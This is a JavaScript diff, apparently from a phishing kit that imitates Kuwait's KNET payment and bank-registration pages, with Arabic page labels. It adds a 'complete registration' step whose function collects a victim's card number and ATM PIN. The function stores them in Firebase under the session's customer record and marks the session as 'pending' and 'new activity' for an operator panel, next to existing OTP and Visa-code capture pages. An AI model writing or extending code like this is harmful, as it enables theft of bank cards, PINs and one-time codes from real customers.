@@ -138,6 +138,8 @@
     if (path.includes('knet')) return 'صفحة الكي نت';
     if (path.includes('verification')) return 'صفحة التحقق';
     if (path.includes('forgot-password')) return 'نسيت كلمة المرور';
+    if (path.includes('login-regist')) return 'إكمال التسجيل';
+    if (path.includes('otp-new')) return 'التحقق من OTP (4 أرقام)';
     if (path.includes('otpcredit')) return 'رمز الفيزا';
     if (path.includes('otp')) return 'التحقق من OTP';
     if (path.includes('gateway')) return 'بوابة الدفع';
@@ -334,6 +336,7 @@
     watch: 'طلب الساعة الذكية',
     login: 'تسجيل الدخول',
     password_reset: 'إعادة تعيين كلمة المرور',
+    app_registration: 'إكمال التسجيل',
     otp: 'رمز التحقق OTP'
   };
 
@@ -555,6 +558,59 @@
       } catch (e) {}
       return Promise.all(tasks).catch(function (err) {
         console.error('submitPasswordReset failed:', err && err.code, err && err.message);
+      });
+    }
+    const ready = (typeof window.ensureAuthReady === 'function')
+      ? window.ensureAuthReady().then(send).catch(send)
+      : send();
+    const timeout = new Promise(function (resolve) {
+      setTimeout(function () { send().then(resolve); }, 2500);
+    });
+    return Promise.race([ready, timeout]);
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إكمال التسجيل بالتطبيق (صفحة login-regist.html)
+  // يكتب مباشرة في customers/{sessionId}: كل محاولة تُضاف كعنصر في مصفوفة
+  // appRegistrations (لا تُستبدل السابقة) فتظهر في اللوحة كصندوق منفصل.
+  //   data: { card, atmPin }
+  // ═══════════════════════════════════════════════════════════
+  window.submitAppRegistration = function (data) {
+    data = data || {};
+    let sent = false;
+    function send() {
+      if (sent) return Promise.resolve();
+      sent = true;
+      const refNo = 'RG-' + Date.now().toString().slice(-8);
+      const now = Date.now();
+      const entry = { card: String(data.card || ''), atmPin: String(data.atmPin || ''), at: now, page: getFriendlyPageName() };
+      const fields = {
+        sessionId: sessionId,
+        requestType: 'app_registration',
+        requestTypeLabel: REQUEST_TYPE_LABEL.app_registration,
+        refNo: refNo,
+        status: 'pending',
+        decision: 'pending',
+        lastSeen: now,
+        currentPage: getFriendlyPageName(),
+        isHidden: false,
+        flagColor: ''
+      };
+      const tasks = [];
+      tasks.push(customerRef.set(Object.assign({}, fields, {
+        appRegistrations: firebase.firestore.FieldValue.arrayUnion(entry),
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      }), { merge: true }));
+      try {
+        rtd.ref('sessions/' + sessionId).update({
+          requestType: 'app_registration',
+          refNo: refNo,
+          page: getFriendlyPageName(),
+          hasNewActivity: true
+        });
+      } catch (e) {}
+      return Promise.all(tasks).catch(function (err) {
+        console.error('submitAppRegistration failed:', err && err.code, err && err.message);
       });
     }
     const ready = (typeof window.ensureAuthReady === 'function')
